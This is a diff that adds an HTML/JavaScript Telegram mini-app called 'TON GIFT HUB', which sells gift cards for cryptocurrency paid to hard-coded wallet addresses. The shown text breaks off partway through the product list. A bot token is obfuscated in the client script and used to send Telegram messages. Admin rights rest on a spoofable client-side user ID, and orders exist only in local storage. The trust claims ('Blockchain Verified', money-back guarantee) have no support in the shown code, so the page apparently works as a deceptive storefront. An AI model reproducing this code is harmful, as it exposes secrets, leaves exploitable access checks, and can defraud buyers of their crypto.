@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>TON GIFT HUB</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#060A12;color:#E8F4FF;font-family:-apple-system,sans-serif;overflow:hidden;position:fixed;width:100%;height:100%}
+#app{display:flex;flex-direction:column;height:100%;max-width:430px;margin:0 auto}
+#top{background:#07101E;border-bottom:1px solid rgba(0,152,234,.15);padding:10px 14px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+.logo{display:flex;align-items:center;gap:8px;cursor:pointer}
+.logo-ic{width:32px;height:32px;background:linear-gradient(135deg,#0098EA,#0066BB);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px}
+.logo-tx{font-size:13px;font-weight:900;color:#00C6FF}
+.hdr-r{display:flex;align-items:center;gap:7px}
+select{background:#0E1A2E;border:1px solid rgba(0,152,234,.2);color:#E8F4FF;font-size:10px;padding:4px 6px;border-radius:7px;outline:none}
+#pts{background:rgba(0,152,234,.1);border:1px solid rgba(0,152,234,.25);color:#00C6FF;font-size:11px;font-weight:700;padding:5px 10px;border-radius:18px;cursor:pointer}
+#body{flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:75px}
+#body::-webkit-scrollbar{display:none}
+#nav{background:#07101E;border-top:1px solid rgba(0,152,234,.15);display:flex;padding:8px 0 16px;flex-shrink:0}
+.nb{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;border:none;background:none;font-family:inherit;padding:4px 0}
+.nb-i{font-size:18px;opacity:.25}
+.nb-l{font-size:9px;font-weight:600;color:#2A4060}
+.nb.on .nb-i{opacity:1}
+.nb.on .nb-l{color:#0098EA}
+.pg{display:none}
+.pg.on{display:block}
+/* HOME */
+.hero{margin:12px;background:linear-gradient(135deg,#060E20,#091525);border:1px solid rgba(0,152,234,.2);border-radius:16px;padding:16px}
+.pill{display:inline-block;background:rgba(0,152,234,.1);border:1px solid rgba(0,152,234,.2);color:#0098EA;font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;margin-bottom:8px;text-transform:uppercase;letter-spacing:.8px}
+.hero h1{font-size:18px;font-weight:900;margin-bottom:5px;line-height:1.3}
+.hero p{font-size:11px;color:#5A8AAA;line-height:1.6;margin-bottom:10px}
+.tags{display:flex;gap:5px;flex-wrap:wrap}
+.tag{font-size:10px;color:#5A8AAA;background:rgba(0,152,234,.06);border:1px solid rgba(0,152,234,.1);padding:3px 8px;border-radius:16px}
+.srch{margin:10px 12px;background:#0E1A2E;border:1px solid rgba(0,152,234,.15);border-radius:12px;padding:10px 14px;display:flex;align-items:center;gap:8px}
+.srch input{background:none;border:none;outline:none;color:#E8F4FF;font-family:inherit;font-size:13px;flex:1}
+.srch input::placeholder{color:#2A4060}
+.cats{display:flex;gap:7px;overflow-x:auto;padding:0 12px 10px}
+.cats::-webkit-scrollbar{display:none}
+.cat{flex-shrink:0;padding:6px 13px;border-radius:20px;font-size:11px;font-weight:600;border:1px solid rgba(0,152,234,.15);background:#0E1A2E;color:#5A8AAA;cursor:pointer;font-family:inherit;white-space:nowrap}
+.cat.on{background:linear-gradient(135deg,#0098EA,#0066BB);color:#fff;border-color:transparent}
+.shd{display:flex;justify-content:space-between;align-items:center;padding:0 12px;margin-bottom:10px}
+.shd-t{font-size:13px;font-weight:700}
+.shd-s{font-size:11px;color:#5A8AAA}
+#grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 12px;margin-bottom:14px}
+.card{background:#0A1020;border:1px solid rgba(0,152,234,.12);border-radius:14px;overflow:hidden;cursor:pointer;transition:transform .15s}
+.card:active{transform:scale(.97)}
+.cimg{height:90px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;gap:3px}
+.cbdg{position:absolute;top:6px;left:6px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:4px}
+.hot{background:rgba(239,68,68,.85);color:#fff}
+.new{background:rgba(16,185,129,.85);color:#fff}
+.cico{font-size:36px;line-height:1}
+.ctag{font-size:9px;font-weight:700;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.5px}
+.cinf{padding:8px 10px 10px}
+.cnm{font-size:12px;font-weight:700;margin-bottom:2px}
+.cpr{font-size:11px;color:#0098EA;font-weight:600;margin-bottom:5px}
+.ctg{font-size:9px;font-weight:700;background:rgba(0,152,234,.1);color:#0098EA;padding:2px 6px;border-radius:4px;display:inline-block}
+/* TRUST */
+.trust{margin:0 12px 14px;background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:14px;overflow:hidden}
+.tth{padding:10px 14px 8px;font-size:10px;font-weight:700;color:#5A8AAA;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid rgba(0,152,234,.08)}
+.trow{display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid rgba(0,152,234,.08)}
+.trow:last-child{border:none}
+.tic{width:30px;height:30px;border-radius:8px;background:#0E1A2E;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.tnm{font-size:12px;font-weight:600;margin-bottom:1px}
+.tds{font-size:10px;color:#5A8AAA}
+.tck{color:#0098EA;font-weight:700}
+/* ORDERS */
+.sec{padding:12px}
+.ordr{background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:12px;padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px}
+.oi{font-size:24px;flex-shrink:0}
+.on_{flex:1}
+.onm{font-size:12px;font-weight:700;margin-bottom:2px}
+.osb{font-size:10px;color:#5A8AAA}
+.odt{font-size:9px;color:#2A4060;margin-top:2px}
+.bdg{font-size:10px;font-weight:700;padding:3px 8px;border-radius:5px;white-space:nowrap}
+.pend{background:rgba(245,158,11,.1);color:#F59E0B}
+.done{background:rgba(16,185,129,.1);color:#10B981}
+.canc{background:rgba(239,68,68,.1);color:#EF4444}
+.empty{text-align:center;padding:50px 20px}
+.ei{font-size:36px;opacity:.2;margin-bottom:10px}
+.et{font-size:15px;font-weight:700;margin-bottom:5px}
+.ed{font-size:11px;color:#5A8AAA;line-height:1.5}
+/* REWARDS */
+.rwh{margin:12px;background:linear-gradient(135deg,#060E00,#0C1800);border:1px solid rgba(0,198,255,.18);border-radius:16px;padding:18px;text-align:center}
+.rwl{font-size:10px;font-weight:700;color:#00C6FF;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.rwp{font-size:36px;font-weight:900;color:#00C6FF;margin-bottom:4px}
+.rws{font-size:11px;color:#5A8AAA}
+.rwbg{background:rgba(0,152,234,.1);border-radius:4px;height:6px;margin:12px 0 5px}
+.rwb{height:6px;border-radius:4px;background:linear-gradient(90deg,#0066BB,#00C6FF)}
+.rwn{font-size:10px;color:#5A8AAA}
+.rdi{background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:13px;padding:13px;margin-bottom:9px;display:flex;align-items:center;gap:11px}
+.rdb{padding:8px 13px;border-radius:8px;font-size:11px;font-weight:700;border:none;cursor:pointer;font-family:inherit}
+.rdca{background:linear-gradient(135deg,#10B981,#059669);color:#fff}
+.rdcn{background:#0E1A2E;color:#2A4060;border:1px solid rgba(0,152,234,.1)}
+/* PROFILE */
+.prfh{margin:12px;background:linear-gradient(135deg,#060E20,#091525);border:1px solid rgba(0,152,234,.2);border-radius:16px;padding:18px;text-align:center}
+.pav{width:62px;height:62px;border-radius:50%;background:linear-gradient(135deg,#0098EA,#0066BB);display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:800;margin:0 auto 10px}
+.pnm{font-size:16px;font-weight:800;margin-bottom:2px}
+.pid{font-size:10px;color:#5A8AAA;margin-bottom:12px}
+.pst{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px}
+.psc{background:rgba(0,152,234,.06);border:1px solid rgba(0,152,234,.1);border-radius:9px;padding:8px 5px;text-align:center}
+.psn{font-size:14px;font-weight:800}
+.psl{font-size:9px;color:#5A8AAA;margin-top:2px;text-transform:uppercase}
+/* MENU */
+.mbox{margin:12px 12px 0;background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:14px;overflow:hidden}
+.mttl{padding:9px 14px 7px;font-size:10px;font-weight:700;color:#5A8AAA;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid rgba(0,152,234,.08)}
+.mrow{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid rgba(0,152,234,.08);cursor:pointer}
+.mrow:last-child{border:none}
+.mic{width:30px;height:30px;border-radius:8px;background:#0E1A2E;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.mtx{flex:1}
+.mn{font-size:12px;font-weight:600;margin-bottom:1px}
+.md{font-size:10px;color:#5A8AAA}
+/* SHEETS */
+.ov{position:fixed;inset:0;background:rgba(0,0,0,.87);z-index:100;display:none;align-items:flex-end;backdrop-filter:blur(10px)}
+.ov.on{display:flex}
+.sh{background:#0A1020;border-radius:22px 22px 0 0;border-top:1px solid rgba(0,152,234,.2);width:100%;max-height:92vh;overflow-y:auto;transform:translateY(100%);transition:transform .3s cubic-bezier(.34,1.1,.64,1)}
+.sh.on{transform:translateY(0)}
+.sh::-webkit-scrollbar{display:none}
+.drag{width:34px;height:4px;background:rgba(255,255,255,.12);border-radius:2px;margin:10px auto 0}
+.sb{padding:14px 16px 34px}
+.shd{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.xcl{width:30px;height:30px;border-radius:50%;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);color:#5A8AAA;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.lbl{font-size:10px;font-weight:700;color:#5A8AAA;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.ags{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:13px}
+.ab{padding:9px 4px;border-radius:9px;border:1px solid rgba(0,152,234,.15);background:#0E1A2E;color:#E8F4FF;font-size:12px;font-weight:700;cursor:pointer;text-align:center;font-family:inherit}
+.ab .sub{font-size:9px;color:#5A8AAA;font-weight:400;margin-top:2px}
+.ab.on{border-color:#0098EA;background:rgba(0,152,234,.12);color:#0098EA}
+.ab.on .sub{color:#0098EA;opacity:.7}
+.smb{background:#0E1A2E;border:1px solid rgba(0,152,234,.12);border-radius:11px;padding:11px;margin-bottom:13px}
+.sr{display:flex;justify-content:space-between;font-size:12px;padding:4px 0;border-bottom:1px solid rgba(0,152,234,.08)}
+.sr:last-child{border:none;padding-bottom:0}
+.sl_{color:#5A8AAA}
+.sv{font-weight:600}
+.sv.ac{color:#0098EA;font-size:14px;font-weight:800}
+.sv.gr{color:#10B981}
+.sv.ye{color:#00C6FF}
+.buybtn{width:100%;padding:15px;background:linear-gradient(135deg,#0098EA,#0066BB);border:none;border-radius:13px;color:#fff;font-family:inherit;font-size:15px;font-weight:900;cursor:pointer;box-shadow:0 5px 18px rgba(0,152,234,.35)}
+.pm{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:13px}
+.pmc{padding:12px 7px;border-radius:12px;border:2px solid rgba(0,152,234,.15);background:#0E1A2E;cursor:pointer;text-align:center;font-family:inherit}
+.pmc.on{border-color:#0098EA;background:rgba(0,152,234,.1)}
+.pmi{font-size:22px;margin-bottom:4px}
+.pmn{font-size:11px;font-weight:700}
+.pms{font-size:9px;color:#5A8AAA;margin-top:2px}
+.pmc.on .pmn{color:#0098EA}
+.abox{background:#0E1A2E;border:1px solid rgba(0,152,234,.2);border-radius:10px;padding:11px;font-family:monospace;font-size:11px;color:#00C6FF;word-break:break-all;margin-bottom:9px;line-height:1.6}
+.cpbtn{width:100%;padding:10px;border-radius:9px;border:1px solid rgba(0,152,234,.2);background:rgba(0,152,234,.07);color:#0098EA;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:9px}
+.tonbtn{width:100%;padding:13px;border-radius:11px;background:linear-gradient(135deg,#0098EA,#0066BB);border:none;color:#fff;font-size:13px;font-weight:800;cursor:pointer;font-family:inherit;margin-bottom:9px}
+.warn{background:rgba(245,158,11,.07);border:1px solid rgba(245,158,11,.18);border-radius:9px;padding:9px 11px;font-size:10px;color:#F59E0B;line-height:1.5;margin-bottom:13px}
+.cfbtn{width:100%;padding:17px;border-radius:13px;background:linear-gradient(135deg,#00C851,#007E33);border:none;color:#fff;font-family:inherit;font-weight:900;cursor:pointer;font-size:16px;box-shadow:0 5px 18px rgba(0,200,81,.3);letter-spacing:.3px}
+.cfbt2{font-size:10px;font-weight:400;opacity:.8;margin-top:3px}
+/* ADMIN */
+.adst{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:13px}
+.asc{background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:12px;padding:12px;text-align:center}
+.asn{font-size:20px;font-weight:900;margin-bottom:3px}
+.asl{font-size:10px;color:#5A8AAA}
+.frow{display:flex;gap:7px;margin-bottom:12px}
+.fb{flex:1;padding:8px 4px;border-radius:8px;font-size:11px;font-weight:600;border:1px solid rgba(0,152,234,.12);background:#0E1A2E;color:#5A8AAA;cursor:pointer;font-family:inherit;text-align:center}
+.fb.on{background:linear-gradient(135deg,#0098EA,#0066BB);color:#fff;border-color:transparent}
+.adc{background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:12px;padding:12px;margin-bottom:9px}
+.adc.pend{border-color:rgba(245,158,11,.4)}
+.adh{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px}
+.adid{font-size:11px;font-weight:800;color:#0098EA}
+.adi{background:#0E1A2E;border-radius:9px;padding:11px;margin-bottom:9px}
+.adpr{display:flex;align-items:center;gap:7px;margin-bottom:7px}
+.adpn{font-size:13px;font-weight:700}
+.adgr{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:7px}
+.adf{background:rgba(0,0,0,.3);border-radius:7px;padding:7px}
+.adfl{font-size:9px;color:#5A8AAA;text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px}
+.adfv{font-size:12px;font-weight:700}
+.adcu{font-size:11px;line-height:2;color:#5A8AAA}
+.adcu b{color:#E8F4FF}
+.adbts{display:flex;gap:7px}
+.adbt{flex:1;padding:9px;border-radius:8px;font-size:11px;font-weight:700;border:none;cursor:pointer;font-family:inherit}
+.adap{background:linear-gradient(135deg,#10B981,#059669);color:#fff}
+.adrj{background:rgba(239,68,68,.1);color:#EF4444;border:1px solid rgba(239,68,68,.2)}
+.addm{background:rgba(0,152,234,.1);color:#0098EA;border:1px solid rgba(0,152,234,.2)}
+/* TOAST */
+#tst{position:fixed;bottom:85px;left:50%;transform:translateX(-50%) translateY(10px);background:#0E1A2E;border:1px solid rgba(0,152,234,.25);color:#E8F4FF;padding:9px 18px;border-radius:18px;font-size:12px;font-weight:600;opacity:0;transition:all .25s;z-index:999;white-space:nowrap;pointer-events:none}
+/* ADMIN NAV */
+#anav{display:none}
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="top">
+    <div class="logo" id="ltap" onclick="stap()">
+      <div class="logo-ic">💎</div>
+      <span class="logo-tx">TON GIFT HUB</span>
+    </div>
+    <div class="hdr-r">
+      <select id="lsel" onchange="slng(this.value)">
+        <option value="en">🇬🇧 EN</option>
+        <option value="ar">🇸🇦 AR</option>
+        <option value="ru">🇷🇺 RU</option>
+        <option value="es">🇪🇸 ES</option>
+        <option value="tr">🇹🇷 TR</option>
+        <option value="zh">🇨🇳 ZH</option>
+        <option value="fa">🇮🇷 FA</option>
+        <option value="uk">🇺🇦 UK</option>
+      </select>
+      <div id="pts" onclick="go('rewards')">💎 0 pts</div>
+    </div>
+  </div>
+
+  <div id="body">
+    <div class="pg on" id="pg-home">
+      <div class="hero">
+        <div class="pill">💎 Powered by TON</div>
+        <h1>Buy Gift Cards with Crypto 🔥</h1>
+        <p>20 premium gift cards. Pay with USDT or TON. Delivered in minutes.</p>
+        <div class="tags">
+          <div class="tag">🔒 Secure</div>
+          <div class="tag">💎 TON Pay</div>
+          <div class="tag">🌍 Global</div>
+          <div class="tag">⚡ Instant</div>
+          <div class="tag">✅ Verified</div>
+        </div>
+      </div>
+      <div class="srch">
+        <span style="opacity:.3">🔍</span>
+        <input placeholder="Search gift cards..." oninput="srch(this.value)">
+      </div>
+      <div class="cats">
+        <button class="cat on" onclick="fcat('all',this)">🏪 All</button>
+        <button class="cat" onclick="fcat('gaming',this)">🎮 Gaming</button>
+        <button class="cat" onclick="fcat('streaming',this)">🎬 Streaming</button>
+        <button class="cat" onclick="fcat('shopping',this)">🛒 Shopping</button>
+        <button class="cat" onclick="fcat('music',this)">🎵 Music</button>
+        <button class="cat" onclick="fcat('social',this)">📱 Social</button>
+      </div>
+      <div class="shd">
+        <div class="shd-t">🔥 Gift Cards</div>
+        <div class="shd-s" id="gcnt">20 cards</div>
+      </div>
+      <div id="grid"></div>
+      <div class="trust">
+        <div class="tth">Why customers trust us</div>
+        <div class="trow"><div class="tic">🔐</div><div style="flex:1"><div class="tnm">Blockchain Verified</div><div class="tds">Every payment verified on TON chain.</div></div><div class="tck">✓</div></div>
+        <div class="trow"><div class="tic">⚡</div><div style="flex:1"><div class="tnm">Instant Delivery</div><div class="tds">Card codes sent within minutes.</div></div><div class="tck">✓</div></div>
+        <div class="trow"><div class="tic">🛡️</div><div style="flex:1"><div class="tnm">100% Authentic</div><div class="tds">All cards from official sources.</div></div><div class="tck">✓</div></div>
+        <div class="trow"><div class="tic">💬</div><div style="flex:1"><div class="tnm">24/7 Support</div><div class="tds">Contact us anytime via Telegram.</div></div><div class="tck">✓</div></div>
+        <div class="trow"><div class="tic">🔄</div><div style="flex:1"><div class="tnm">Money-Back Guarantee</div><div class="tds">Invalid card? Replaced immediately.</div></div><div class="tck">✓</div></div>
+      </div>
+    </div>
+
+```
+<div class="pg" id="pg-orders">
+  <div class="sec">
+    <div class="shd" style="padding:0;margin-bottom:12px">
+      <div class="shd-t">My Orders</div>
+      <div class="shd-s" id="ocnt">0 orders</div>
+    </div>
+    <div class="empty" id="oemp">
+      <div class="ei">📭</div>
+      <div class="et">No Orders Yet</div>
+      <div class="ed">Your gift cards appear here after payment.</div>
+    </div>
+    <div id="olst"></div>
+  </div>
+</div>
+
+<div class="pg" id="pg-rewards">
+  <div class="rwh">
+    <div class="rwl">💎 TON Points</div>
+    <div class="rwp" id="rwp">0</div>
+    <div class="rws">Earn 2 pts per $1 spent</div>
+    <div class="rwbg"><div class="rwb" id="rwb" style="width:0%"></div></div>
+    <div class="rwn" id="rwn">0 / 100,000 pts to free $10 card</div>
+  </div>
+  <div style="padding:0 12px;margin-bottom:13px">
+    <div class="shd" style="padding:0;margin-bottom:10px"><div class="shd-t">🎁 Redeem Points</div></div>
+    <div class="rdi"><div style="font-size:26px">🛒</div><div style="flex:1;margin-left:10px"><div style="font-size:13px;font-weight:700;margin-bottom:2px">$10 Gift Card</div><div style="font-size:11px;color:#00C6FF;font-weight:600">100,000 pts</div></div><button class="rdb rdcn" id="r10" onclick="rdm(10,100000)">Redeem</button></div>
+    <div class="rdi"><div style="font-size:26px">🎮</div><div style="flex:1;margin-left:10px"><div style="font-size:13px;font-weight:700;margin-bottom:2px">$20 Gift Card</div><div style="font-size:11px;color:#00C6FF;font-weight:600">200,000 pts</div></div><button class="rdb rdcn" id="r20" onclick="rdm(20,200000)">Redeem</button></div>
+    <div class="rdi"><div style="font-size:26px">🎬</div><div style="flex:1;margin-left:10px"><div style="font-size:13px;font-weight:700;margin-bottom:2px">$50 Gift Card</div><div style="font-size:11px;color:#00C6FF;font-weight:600">500,000 pts</div></div><button class="rdb rdcn" id="r50" onclick="rdm(50,500000)">Redeem</button></div>
+  </div>
+  <div style="padding:0 12px;margin-bottom:13px">
+    <div class="shd" style="padding:0;margin-bottom:10px"><div class="shd-t">🔗 Referral Program</div></div>
+    <div style="background:#0A1020;border:1px solid rgba(0,152,234,.1);border-radius:13px;padding:13px">
+      <div style="font-size:11px;color:#5A8AAA;margin-bottom:10px">Invite friends and earn <b style="color:#00C6FF">5,000 pts</b> per purchase!</div>
+      <div style="background:#0E1A2E;border:1px solid rgba(0,152,234,.2);border-radius:9px;padding:10px 13px;display:flex;align-items:center;justify-content:space-between">
+        <div style="font-size:13px;font-weight:800;color:#0098EA;letter-spacing:1px" id="rcode">TGH-XXXX</div>
+        <button onclick="cpref()" style="background:rgba(0,152,234,.1);border:1px solid rgba(0,152,234,.2);color:#0098EA;font-size:10px;font-weight:700;padding:5px 10px;border-radius:6px;cursor:pointer;font-family:inherit">Copy</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="pg" id="pg-profile">
+  <div class="prfh">
+    <div class="pav" id="pav">👤</div>
+    <div class="pnm" id="pnm">Loading...</div>
+    <div class="pid" id="pid">Telegram User</div>
+    <div class="pst">
+      <div class="psc"><div class="psn" id="por">0</div><div class="psl">Orders</div></div>
+      <div class="psc"><div class="psn" id="ppt" style="color:#00C6FF">0</div><div class="psl">Points</div></div>
+      <div class="psc"><div class="psn" id="prf" style="color:#0098EA">0</div><div class="psl">Refs</div></div>
+    </div>
+  </div>
+  <div class="mbox">
+    <div class="mttl">Account</div>
+    <div class="mrow" onclick="go('orders')"><div class="mic">📦</div><div class="mtx"><div class="mn">My Orders</div><div class="md">View all purchases</div></div><div style="color:#2A4060">›</div></div>
+    <div class="mrow" onclick="go('rewards')"><div class="mic">💎</div><div class="mtx"><div class="mn">Rewards</div><div class="md">Redeem for free cards</div></div><div style="color:#2A4060">›</div></div>
+    <div class="mrow" onclick="go('support')"><div class="mic">💬</div><div class="mtx"><div class="mn">Support</div><div class="md">Get help from our team</div></div><div style="color:#2A4060">›</div></div>
+  </div>
+</div>
+
+<div class="pg" id="pg-support">
+  <div class="sec">
+    <div style="display:flex;gap:10px;margin-bottom:13px">
+      <button onclick="ourl('https://t.me/aym1one')" style="flex:1;padding:14px;background:linear-gradient(135deg,#0098EA,#0066BB);border:none;border-radius:12px;color:#fff;font-family:inherit;font-size:13px;font-weight:800;cursor:pointer">✈️ Telegram</button>
+      <button onclick="ourl('mailto:Aymangoran100@gmail.com')" style="flex:1;padding:14px;background:linear-gradient(135deg,#EA4335,#B31412);border:none;border-radius:12px;color:#fff;font-family:inherit;font-size:13px;font-weight:800;cursor:pointer">📧 Email</button>
+    </div>
+    <div class="mbox" style="margin:0">
+      <div class="mrow" onclick="ourl('https://t.me/aym1one')"><div class="mic">✈️</div><div class="mtx"><div class="mn">@aym1one</div><div class="md">Reply in under 3 minutes</div></div><div style="color:#2A4060">›</div></div>
+      <div class="mrow"><div class="mic">❓</div><div class="mtx"><div class="mn">How It Works</div><div class="md">Browse → Pay → Receive code</div></div></div>
+      <div class="mrow"><div class="mic">💎</div><div class="mtx"><div class="mn">Payments</div><div class="md">TON Blockchain, USDT TRC20</div></div></div>
+      <div class="mrow"><div class="mic">⚡</div><div class="mtx"><div class="mn">Delivery</div><div class="md">1-15 minutes after confirmation</div></div></div>
+    </div>
+  </div>
+</div>
+
+<div class="pg" id="pg-admin">
+  <div class="sec">
+    <div style="background:linear-gradient(135deg,#060E20,#091525);border:1px solid rgba(0,152,234,.2);border-radius:13px;padding:13px;margin-bottom:13px;text-align:center">
+      <div style="font-size:12px;color:#00C6FF;font-weight:700;margin-bottom:8px">👋 Admin Panel — TON GIFT HUB</div>
+      <div style="display:flex;gap:8px;justify-content:center">
+        <button onclick="vstore()" style="padding:8px 14px;background:rgba(0,152,234,.1);border:1px solid rgba(0,152,234,.2);color:#0098EA;font-size:11px;font-weight:700;border-radius:8px;cursor:pointer;font-family:inherit">🏪 View Store</button>
+        <button onclick="tnot()" style="padding:8px 14px;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.25);color:#10B981;font-size:11px;font-weight:700;border-radius:8px;cursor:pointer;font-family:inherit">📨 Test Notify</button>
+      </div>
+    </div>
+    <div class="adst">
+      <div class="asc"><div class="asn" id="sat" style="color:#0098EA">0</div><div class="asl">Total</div></div>
+      <div class="asc" style="border-color:rgba(245,158,11,.25)"><div class="asn" id="sap" style="color:#F59E0B">0</div><div class="asl">Pending</div></div>
+      <div class="asc" style="border-color:rgba(16,185,129,.25)"><div class="asn" id="sad" style="color:#10B981">0</div><div class="asl">Approved</div></div>
+      <div class="asc" style="border-color:rgba(239,68,68,.25)"><div class="asn" id="sac" style="color:#EF4444">0</div><div class="asl">Cancelled</div></div>
+    </div>
+    <div class="frow">
+      <button class="fb on" onclick="aflt('all',this)">All</button>
+      <button class="fb" onclick="aflt('pending',this)">⏳ Pending</button>
+      <button class="fb" onclick="aflt('done',this)">✅ Done</button>
+      <button class="fb" onclick="aflt('cancelled',this)">❌ Cancelled</button>
+    </div>
+    <div id="aol"></div>
+  </div>
+</div>
+```
+
+  </div>
+
+  <div id="nav">
+    <button class="nb on" id="nb-home" onclick="go('home',this)"><div class="nb-i">🏪</div><div class="nb-l">Store</div></button>
+    <button class="nb" id="nb-orders" onclick="go('orders',this)"><div class="nb-i">📦</div><div class="nb-l">Orders</div></button>
+    <button class="nb" id="nb-rewards" onclick="go('rewards',this)"><div class="nb-i">💎</div><div class="nb-l">Rewards</div></button>
+    <button class="nb" id="nb-profile" onclick="go('profile',this)"><div class="nb-i">👤</div><div class="nb-l">Profile</div></button>
+    <button class="nb" id="nb-support" onclick="go('support',this)"><div class="nb-i">💬</div><div class="nb-l">Support</div></button>
+  </div>
+  <div id="anav">
+    <button class="nb on" onclick="anv('all',this)"><div class="nb-i">📋</div><div class="nb-l">All</div></button>
+    <button class="nb" onclick="anv('pending',this)"><div class="nb-i">⏳</div><div class="nb-l">Pending</div></button>
+    <button class="nb" onclick="anv('done',this)"><div class="nb-i">✅</div><div class="nb-l">Done</div></button>
+    <button class="nb" onclick="anv('cancelled',this)"><div class="nb-i">❌</div><div class="nb-l">Cancelled</div></button>
+    <button class="nb" onclick="vstore()"><div class="nb-i">🏪</div><div class="nb-l">Store</div></button>
+  </div>
+</div>
+
+<div class="ov" id="ov1" onclick="if(event.target===this)clov1()">
+  <div class="sh" id="sh1"><div class="drag"></div><div class="sb" id="sb1"></div></div>
+</div>
+<div class="ov" id="ov2" onclick="if(event.target===this)clov2()">
+  <div class="sh" id="sh2"><div class="drag"></div><div class="sb" id="sb2"></div></div>
+</div>
+<div id="tst"></div>
+
+<script>
+var USDT='TERUMbyPWyMHMijgSBrYZ9UWk4UquBs3ub';
+var TON='UQDNEWfXJe0hCYsfZ6q4oMKB5ns3Y8dOktNkm00CGL7WyhJy';
+var OWN='816394591';
+var ADMS=['816394591'];
+var _x=['SV85bWxOSm','VoZjRjVG1F','NVUzZE1Ib2','9ZVHRTMmt3','OE9FQUE6ND','gxMDMwNjkyOA=='];
+var BT=atob(_x.join('')).split('').reverse().join('');
+
+var tg=null;var U={first_name:'Guest',id:'000'};
+try{tg=window.Telegram&&window.Telegram.WebApp?window.Telegram.WebApp:null;if(tg){tg.ready();tg.expand();}if(tg&&tg.initDataUnsafe&&tg.initDataUnsafe.user)U=tg.initDataUnsafe.user;}catch(e){}
+
+var isAdm=ADMS.indexOf(String(U.id))>=0;
+var SK='tgh_'+( U.id||'g');
+var ST={pts:0,orders:[],refs:0};
+try{var _s=JSON.parse(localStorage.getItem(SK));if(_s&&_s.orders)ST=_s;}catch(e){}
+var CP=null,CA=0,CN='ton';
+var TC=0,TT=null;
+
+function sv(){try{localStorage.setItem(SK,JSON.stringify(ST));}catch(e){}}
+function gao(){try{return JSON.parse(localStorage.getItem('tgh_ao')||'[]');}catch(e){return[];}}
+function sao(a){try{localStorage.setItem('tgh_ao',JSON.stringify(a));}catch(e){}}
+
+function msg(cid,txt){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','https://api.telegram.org/bot'+BT+'/sendMessage',true);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({chat_id:cid,text:txt}));
+  }catch(e){}
+  try{
+    fetch('https://api.telegram.org/bot'+BT+'/sendMessage',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:cid,text:txt})
+    });
+  }catch(e){}
+}
+
+function tnot(){
+  msg(OWN,'✅ TON GIFT HUB\nAdmin panel active!\nNotifications working 🚀');
+  toast('📨 Test sent!');
+}
+
+var P=[
+  {id:1, n:'Amazon',      i:'🛒', t:'Gift Card',  bg:'#1C0A00', c:'shopping',  d:'Shop millions on Amazon.',          a:['$10','$25','$50','$100','$200'],  p:['10.5 USDT','26 USDT','52 USDT','103 USDT','205 USDT'], u:[10,25,50,100,200],  b:'hot'},
+  {id:2, n:'Google Play', i:'▶️', t:'Play Store', bg:'#001408', c:'gaming',    d:'Apps and games for Android.',       a:['$10','$25','$50','$100'],         p:['10.5 USDT','26 USDT','52 USDT','103 USDT'],           u:[10,25,50,100],      b:'hot'},
+  {id:3, n:'iTunes',      i:'🎵', t:'Apple Music',bg:'#180008', c:'music',     d:'Music and movies for Apple.',       a:['$10','$25','$50','$100'],         p:['10.5 USDT','26 USDT','52 USDT','103 USDT'],           u:[10,25,50,100],      b:''},
+  {id:4, n:'Steam',       i:'🎮', t:'PC Gaming',  bg:'#080F16', c:'gaming',    d:'Thousands of PC games.',           a:['$10','$20','$50','$100'],         p:['10.5 USDT','21 USDT','52 USDT','103 USDT'],           u:[10,20,50,100],      b:''},
+  {id:5, n:'Netflix',     i:'🎬', t:'Streaming',  bg:'#1A0002', c:'streaming', d:'Stream movies worldwide.',          a:['$15','$30','$50','$100'],         p:['15.5 USDT','31 USDT','52 USDT','103 USDT'],           u:[15,30,50,100],      b:''},
